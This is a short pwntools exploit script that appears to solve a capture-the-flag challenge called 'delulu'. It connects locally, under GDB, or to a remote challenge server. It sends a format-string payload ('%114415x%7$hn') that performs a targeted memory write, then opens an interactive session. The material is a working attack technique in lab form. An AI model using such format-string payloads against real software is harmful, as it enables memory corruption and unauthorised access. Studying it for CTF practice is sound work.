#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './delulu'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '94.237.56.188', 44724

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+129
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    payload = b'%114415x%7$hn'

    io.sendline(payload)
    # io.sendlineafter(b'>', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()